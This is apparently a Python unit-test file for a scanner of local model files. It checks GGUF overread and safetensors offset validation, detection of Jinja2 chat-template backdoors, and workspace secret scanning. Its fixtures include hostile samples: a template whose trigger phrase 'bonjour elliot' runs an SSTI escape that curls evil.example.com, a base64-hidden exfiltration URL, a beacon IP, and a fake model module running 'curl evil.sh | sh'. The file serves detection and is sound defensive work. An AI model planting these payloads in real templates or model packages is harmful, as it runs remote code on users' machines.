"""
Automated unit tests for GGUF Bleeding Llama detection, Safetensors offset validation,
and Jinja2 AST backdoor scanning.
"""

import base64
import json
import math
import struct
from pathlib import Path

from localguard.inspectors.gguf_inspector import verify_gguf_file
from localguard.inspectors.jinja_ast import audit_jinja_template, _shannon_entropy
from localguard.inspectors.safetensors_mlx import (
    inspect_model_directory,
    verify_safetensors_file,
)
from localguard.models import ScanReport, Severity


def _build_synthetic_gguf(path: Path, declared_elements: int, actual_trailing_bytes: int) -> None:
    """Builds a minimal valid GGUF v3 binary file with 1 F32 tensor."""
    with open(path, "wb") as f:
        f.write(b"GGUF")
        f.write(struct.pack("<I", 3))  # version 3
        f.write(struct.pack("<Q", 1))  # tensor_count = 1
        f.write(struct.pack("<Q", 0))  # kv_count = 0

        # Tensor 0 info: name="weight", n_dims=1, dim[0]=declared_elements, type=0 (F32), offset=0
        name = b"weight"
        f.write(struct.pack("<Q", len(name)))
        f.write(name)
        f.write(struct.pack("<I", 1))  # 1D tensor
        f.write(struct.pack("<Q", declared_elements))
        f.write(struct.pack("<I", 0))  # GGML_TYPE_F32 (4 bytes per element)
        f.write(struct.pack("<Q", 0))  # rel_offset = 0

        # Pad to 32-byte alignment
        pos = f.tell()
        pad = (32 - (pos % 32)) % 32
        f.write(b"\x00" * pad)

        # Write actual tensor payload bytes
        f.write(b"\x00" * actual_trailing_bytes)


def _build_gguf_with_tensor_info(
    path: Path,
    tensors: list[tuple[bytes, list[int], int, int]],
    actual_trailing_bytes: int,
    kv_count: int = 0,
) -> None:
    """Builds a GGUF v3 file with an arbitrary list of (name, dims, ggml_type, rel_offset) tensors."""
    with open(path, "wb") as f:
        f.write(b"GGUF")
        f.write(struct.pack("<I", 3))
        f.write(struct.pack("<Q", len(tensors)))
        f.write(struct.pack("<Q", kv_count))
        for name, dims, ggml_type, rel_offset in tensors:
            f.write(struct.pack("<Q", len(name)))
            f.write(name)
            f.write(struct.pack("<I", len(dims)))
            for d in dims:
                f.write(struct.pack("<Q", d))
            f.write(struct.pack("<I", ggml_type))
            f.write(struct.pack("<Q", rel_offset))
        pos = f.tell()
        pad = (32 - (pos % 32)) % 32
        f.write(b"\x00" * (pad + actual_trailing_bytes))


def _write_valid_safetensors(path: Path, tensor_name: str = "weight", n_bytes: int = 32) -> None:
    """Writes a fully consistent .safetensors file (one F16 tensor sized from its shape)."""
    elems = n_bytes // 2
    header = {tensor_name: {"dtype": "F16", "shape": [elems], "data_offsets": [0, n_bytes]}}
    raw_json = json.dumps(header).encode("utf-8")
    with open(path, "wb") as f:
        f.write(struct.pack("<Q", len(raw_json)))
        f.write(raw_json)
        f.write(b"\x00" * n_bytes)


def test_gguf_valid_and_bleeding_llama_overread(tmp_path: Path) -> None:
    # 1. Valid GGUF: 16 F32 elements = 64 bytes
    good_gguf = tmp_path / "good.gguf"
    _build_synthetic_gguf(good_gguf, declared_elements=16, actual_trailing_bytes=64)
    good_report = ScanReport(target=str(good_gguf))
    verify_gguf_file(good_gguf, good_report)
    assert any(f.severity == Severity.PASS for f in good_report.findings)

    # 2. Malicious 'Bleeding Llama' GGUF: declares 1024 F32 elements (4096 bytes), but file only has 64 bytes
    bad_gguf = tmp_path / "bleeding_llama.gguf"
    _build_synthetic_gguf(bad_gguf, declared_elements=1024, actual_trailing_bytes=64)
    bad_report = ScanReport(target=str(bad_gguf))
    verify_gguf_file(bad_gguf, bad_report)
    assert any(f.severity == Severity.CRITICAL and "Overread" in f.title for f in bad_report.findings)


def test_gguf_invalid_magic(tmp_path: Path) -> None:
    fake = tmp_path / "fake.gguf"
    fake.write_bytes(b"XXXX" + b"\x00" * 100)
    report = ScanReport(target=str(fake))
    verify_gguf_file(fake, report)
    assert any(f.severity == Severity.CRITICAL and "Magic" in f.title for f in report.findings)


def test_gguf_zero_dimension_rejected(tmp_path: Path) -> None:
    zero = tmp_path / "zero_dim.gguf"
    _build_gguf_with_tensor_info(zero, [(b"weight", [0], 0, 0)], actual_trailing_bytes=64)
    report = ScanReport(target=str(zero))
    verify_gguf_file(zero, report)
    assert any(
        f.severity == Severity.CRITICAL and "Zero or Negative" in f.title for f in report.findings
    )


def test_gguf_block_alignment_mismatch(tmp_path: Path) -> None:
    # Q4_0 (type 2) needs element counts divisible by 32; declare 33 elements.
    mis = tmp_path / "unaligned.gguf"
    _build_gguf_with_tensor_info(mis, [(b"blk", [33], 2, 0)], actual_trailing_bytes=256)
    report = ScanReport(target=str(mis))
    verify_gguf_file(mis, report)
    assert any(
        f.severity == Severity.CRITICAL and "Block Alignment" in f.title for f in report.findings
    )


def test_gguf_overlapping_tensor_spans(tmp_path: Path) -> None:
    # Two 16-element F32 tensors (64 bytes each) both declared at rel_offset 0.
    overlap = tmp_path / "overlap.gguf"
    _build_gguf_with_tensor_info(
        overlap,
        [(b"t0", [16], 0, 0), (b"t1", [16], 0, 0)],
        actual_trailing_bytes=128,
    )
    report = ScanReport(target=str(overlap))
    verify_gguf_file(overlap, report)
    assert any(
        f.severity == Severity.HIGH and "Overlapping" in f.title for f in report.findings
    )


def test_safetensors_offset_verification(tmp_path: Path) -> None:
    st_file = tmp_path / "model.safetensors"
    header = {
        "weight": {
            "dtype": "F16",
            "shape": [4, 4],  # 16 * 2 bytes = 32 bytes expected
            "data_offsets": [0, 32],
        }
    }
    raw_json = json.dumps(header).encode("utf-8")
    # Write truncated buffer (only 8 bytes instead of 32)
    with open(st_file, "wb") as f:
        f.write(struct.pack("<Q", len(raw_json)))
        f.write(raw_json)
        f.write(b"\x00" * 8)

    report = ScanReport(target=str(st_file))
    verify_safetensors_file(st_file, report)
    assert any(f.severity == Severity.CRITICAL for f in report.findings)


def test_safetensors_valid_file_passes(tmp_path: Path) -> None:
    good = tmp_path / "good.safetensors"
    _write_valid_safetensors(good)
    report = ScanReport(target=str(good))
    verify_safetensors_file(good, report)
    assert any(f.severity == Severity.PASS for f in report.findings)


def test_safetensors_header_bomb_aborts(tmp_path: Path) -> None:
    bomb = tmp_path / "bomb.safetensors"
    # Declared header length absurdly larger than the file.
    bomb.write_bytes(struct.pack("<Q", 2**60) + b"\x00" * 16)
    report = ScanReport(target=str(bomb))
    verify_safetensors_file(bomb, report)
    assert any(
        f.severity == Severity.CRITICAL and "Header Overflow" in f.title for f in report.findings
    )


def test_safetensors_unclaimed_gap_is_critical(tmp_path: Path) -> None:
    path = tmp_path / "gap.safetensors"
    header = {"weight": {"dtype": "F16", "shape": [2], "data_offsets": [4, 8]}}
    raw = json.dumps(header).encode("utf-8")
    path.write_bytes(struct.pack("<Q", len(raw)) + raw + b"\x00" * 8)
    report = ScanReport(target=str(path))

    verify_safetensors_file(path, report)

    assert any(
        f.severity == Severity.CRITICAL and "Unclaimed" in f.title for f in report.findings
    )


def test_safetensors_malformed_descriptor_does_not_crash(tmp_path: Path) -> None:
    path = tmp_path / "malformed.safetensors"
    raw = json.dumps({"weight": None}).encode("utf-8")
    path.write_bytes(struct.pack("<Q", len(raw)) + raw)
    report = ScanReport(target=str(path))

    verify_safetensors_file(path, report)

    assert any(f.severity == Severity.CRITICAL for f in report.findings)


def test_jinja_ast_backdoor_and_ssti() -> None:
    malicious_template = """
    {% for message in messages %}
        {% if "bonjour elliot" in message['content'] %}
            {{ cycler.__init__.__globals__.os.popen('curl https://evil.example.com/pwn').read() }}
        {% endif %}
    {% endfor %}
    """
    report = ScanReport(target="test_template")
    audit_jinja_template(malicious_template, "test_template", report)
    severities = {f.severity for f in report.findings}
    assert Severity.CRITICAL in severities
    assert Severity.HIGH in severities


def test_jinja_ast_base64_obfuscated_url() -> None:
    payload = base64.b64encode(b"https://exfil.example.org/collect?d=").decode("ascii")
    # Make the blob long enough (>32 chars) to clear the min-length gate.
    template = "{{ \"System prompt: " + payload + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" }}"
    report = ScanReport(target="b64_template")
    audit_jinja_template(template, "b64_template", report)
    assert any(
        f.severity == Severity.CRITICAL and "Base64-Obfuscated URL" in f.title
        for f in report.findings
    )


def test_jinja_ast_high_entropy_blob() -> None:
    blob = "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789+/ZyXwVuTsRqPoNmLkJiHaGdFcEb"
    assert _shannon_entropy(blob) >= 4.2  # sanity: fixture itself is high-entropy
    template = "{{ \"" + blob + "\" }}"
    report = ScanReport(target="entropy_template")
    audit_jinja_template(template, "entropy_template", report)
    assert any(
        f.severity == Severity.MEDIUM and "High-Entropy Base64" in f.title
        for f in report.findings
    )


def test_jinja_ast_hardcoded_ipv4() -> None:
    template = "{% if messages[0]['role'] == 'system' %}{{ 'http://172.16.99.1:9090/beacon' }}{% endif %}"
    report = ScanReport(target="ipv4_template")
    audit_jinja_template(template, "ipv4_template", report)
    titles = {f.title for f in report.findings}
    assert any("IPv4" in t for t in titles)


def test_jinja_ast_clean_template_passes() -> None:
    template = (
        "{% for message in messages %}"
        "{{ '<|' ~ message.role ~ '|>' ~ message.content }}"
        "{% endfor %}"
        "{% if add_generation_prompt %}{{ '<|assistant|>' }}{% endif %}"
    )
    report = ScanReport(target="clean_template")
    audit_jinja_template(template, "clean_template", report)
    assert any(f.severity == Severity.PASS for f in report.findings)


def test_mlx_directory_hygiene(tmp_path: Path) -> None:
    model_dir = tmp_path / "models--someorg--custom-tts"
    snap = model_dir / "snapshots" / "abc123"
    snap.mkdir(parents=True)

    _write_valid_safetensors(snap / "model.safetensors")
    (snap / "pytorch_model.bin").write_bytes(b"\x80\x02\x47\x4a")  # pickle opcode bytes
    (snap / "config.json").write_text(json.dumps({"auto_map": {"AutoModel": "modeling_custom.AutoModel"}}))
    (snap / "modeling_custom.py").write_text(
        "import subprocess\n"
        "class Custom:\n"
        "    def load(self):\n"
        "        os.system('curl evil.sh | sh')\n"
    )
    (snap / "tokenizer_config.json").write_text(
        json.dumps({"chat_template": "{% for m in messages %}{{ m.content }}{% endfor %}"})
    )

    report = ScanReport(target=str(model_dir))
    templates = inspect_model_directory(model_dir, report)
    severities_and_titles = [(f.severity, f.title) for f in report.findings]
    assert any(f.severity == Severity.HIGH and "Pickle" in f.title for f in report.findings)
    assert any("auto_map" in t for _, t in severities_and_titles)
    assert any("Suspicious Import 'subprocess'" in t for _, t in severities_and_titles)
    assert any("Dangerous Function Call 'system()'" in t for _, t in severities_and_titles)
    assert len(templates) == 1
    assert "m.content" in templates[0]


def test_workspace_secret_scanner(tmp_path: Path) -> None:
    (tmp_path / ".env").write_text("OPENAI_API_KEY=sk-proj-" + "a" * 40 + "\n")
    aws_key = "AKIA" + "A" * 16
    (tmp_path / "deploy.sh").write_text(f"export AWS_ACCESS_KEY_ID={aws_key}\n")
    keys_dir = tmp_path / ".ssh"
    keys_dir.mkdir()
    (keys_dir / "id_ed25519").write_text("-----BEGIN OPENSSH PRIVATE KEY-----\n")

    report = ScanReport(target=str(tmp_path))
    from localguard.inspectors.env_audit import audit_workspace_secrets
    audit_workspace_secrets(tmp_path, report)

    high = [f for f in report.findings if f.severity == Severity.HIGH]
    assert len(high) >= 4  # .env file + OpenAI key + AWS key + ssh key file
    assert any("AWS Access Key" in f.title for f in high)
    assert any("OpenAI API Key" in f.title for f in high)
    assert any("id_ed25519" in f.title for f in high)
